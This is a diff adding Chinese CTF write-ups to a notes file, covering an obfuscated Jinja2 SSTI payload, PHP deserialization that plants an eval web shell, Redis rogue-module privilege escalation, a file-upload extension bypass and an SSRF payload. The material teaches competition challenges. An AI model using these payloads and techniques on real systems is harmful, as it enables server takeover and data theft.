@@ -11022,11 +11022,193 @@ if(isset($_GET['file'])){
 
 混淆后：
 {% print(''|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))|attr('%c%c%c%c%c%c%c%c'|format(95,95,98,97,115,101,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))(395)|attr('%c%c%c%c%c%c%c%c'|format(95,95,105,110,105,116,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))('%c%c'|format(111,115))|attr('%c%c%c%c%c'|format(112,111,112,101,110))('cat /flag')|attr('%c%c%c%c'|format(114,101,97,100))()) %}
+
+"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95) = __class__
+'%c%c%c%c%c%c%c%c'|format(95,95,98,97,115,101,95,95) = __base__
+'%c%c%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95) = __subclasses__
+'%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95) = __getitem__
+'%c%c%c%c%c%c%c%c'|format(95,95,105,110,105,116,95,95) = __init__
+'%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95) = __globals__
+'%c%c'|format(111,115) = os
+'%c%c%c%c%c'|format(112,111,112,101,110) = popen
+'%c%c%c%c'|format(114,101,97,100) = read
 ```
 
 看了一些别人的做法，发现了一个叫fenjing的工具可以一把梭！害，拼了那么久的payload不够人家一把梭
 
 ![image-20240616211136607](CTF.assets/image-20240616211136607.png)
+
+## [天翼杯 2021]esay_eval
+
+```php
+<?php
+class A{
+    public $code = "";
+    function __call($method,$args){
+        eval($this->code);
+        
+    }
+    function __wakeup(){
+        $this->code = "";
+    }
+}
+
+class B{
+    function __destruct(){
+        echo $this->a->a();
+    }
+}
+if(isset($_REQUEST['poc'])){
+    preg_match_all('/"[BA]":(.*?):/s',$_REQUEST['poc'],$ret);
+    if (isset($ret[1])) {
+        foreach ($ret[1] as $i) {
+            if(intval($i)!==1){
+                exit("you want to bypass wakeup ? no !");
+            }
+        }
+        unserialize($_REQUEST['poc']);    
+    }
+
+
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+很简单的反序列化，主要的难点在于`wakeup`的绕过，这里的关键是**反序列化的过程中，类名不分大小写**（感觉这里跟PHP函数不区分da'xiao'xie）
+
+另外，由于disabled_function过滤了大量的函数，所以必须要连蚁剑；这里蠢了的是一开始一直想着让`code=$_POST["cmd"]`，但是一直报`eval()`语法错误，其实直接套多一层`eval()`就可以很轻易的解决这个问题
+
+```
+O:1:"B":1:{s:1:"a";O:1:"a":2:{s:4:"code";s:20:"eval($_POST["cmd"]);";}}
+```
+
+后面就是连蚁剑然后上插件了，这里还有一种方法就是Redis提权：
+
+> Redis 中的 `exp.so` 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。
+>
+> Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。`exp.so` 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。
+>
+> 在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 `exp.so` 文件到 Redis 服务器中，并使用 Redis 的 `module load` 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权。
+>
+> 即如果我们连接上了目标Redis就可以尝试做提权
+
+exp.so文件地址下载：https://github.com/Dliv3/redis-rogue-server
+
+上传exp.so进行redis提权
+
+然后利用蚁剑redis插件进行提权，Redis管理是一个插件，需要挂上代理下载
+
+![img](CTF.assets/2174350-20220611235843648-808728164.png)
+
+![img](CTF.assets/2174350-20220611235856508-422697008.png)
+
+先在有权限的目录上传一个exp.so文件
+
+在Redis命令行执行
+
+```
+MODULE LOAD /var/www/html/exp.so
+system.exec "命令"
+```
+
+[![img](CTF.assets/2174350-20220612000132447-1860052329.png)](https://img2022.cnblogs.com/blog/2174350/202206/2174350-20220612000132447-1860052329.png)
+
+## [UUCTF 2022 新生赛]ez_upload
+
+一道由于代码问题导致的任意文件上传
+
+主要代码：
+
+```php
+<?php
+$flag1=true;
+$flag2=true;
+$file_name=$_FILES['file']['name'];             // 1.php.jpg
+$file_type=$_FILES['file']['type'];             // image/png
+$allow_file_type=['image/jpeg','image/png'];
+$allowedExts = array("php", "php3", "php5", "phtml","htaccess");
+$ext=substr($file_name,strpos($file_name,".")+1);
+if(!in_array(strtolower($file_type),$allow_file_type)){
+    $flag1=false;
+    die("你好坏哦，不理你了");
+}
+if(in_array(strtolower($ext),$allowedExts)){
+    $flag2=false;
+    die("你好坏哦，不理你了");
+}
+if($flag1&&$flag2){
+    if (file_exists("upload/" . $_FILES["file"]["name"]))
+    {
+        echo $_FILES["file"]["name"] . " 文件已经存在。 ";
+    }
+    else
+    {
+        // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下
+        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
+        echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];
+    }
+}
+else{
+    echo "Hacker，你好坏哟";
+}
+
+```
+
+这里如果将文件名改为：`1.jpg.php`，得到的文件后缀就是：`jpg.php`。成功绕过了黑名单，并且执行
+
+![image-20240617200618556](CTF.assets/image-20240617200618556.png)
+
+## [HNCTF 2022 WEEK2]ez_ssrf
+
+`fsockopen`本身不支持如`gopher file dict`这类的伪协议，`fsockopen`用作创建一个套接字，再用`fget`往套接字里面写内容，**写进什么协议就是什么协议的包**
+
+```php
+<?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+
+$data=base64_decode($_GET['data']);
+$host=$_GET['host'];
+$port=$_GET['port'];
+
+$fp=fsockopen($host,intval($port),$error,$errstr,30);
+if(!$fp) {
+    die();
+}
+else {
+    fwrite($fp,$data);
+    while(!feof($data))
+    {
+        echo fgets($fp,128);
+    }
+    fclose($fp);
+}
+```
+
+`fsockopen`向本地发送HTTP报文示例；这里顺便复习一下HTTP GET报文的格式：
+
++ 必须带有`GET / HTTP/1.1`和`HOST`
++ 字段之间用换行分割
++ 结尾需要用**两个换行**
+
+![image-20240617214854333](CTF.assets/image-20240617214854333.png)
+
+以此构造出payload：
+
+```php
+<?php
+$out = "GET /flag.php HTTP/1.1\r\n";
+$out .= "Host: 127.0.0.1\r\n\r\n";
+
+var_dump(base64_encode($out));
+# string(60) "R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQoNCg=="
+```
+
+```php
+?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQoNCg
+```
 
 
 
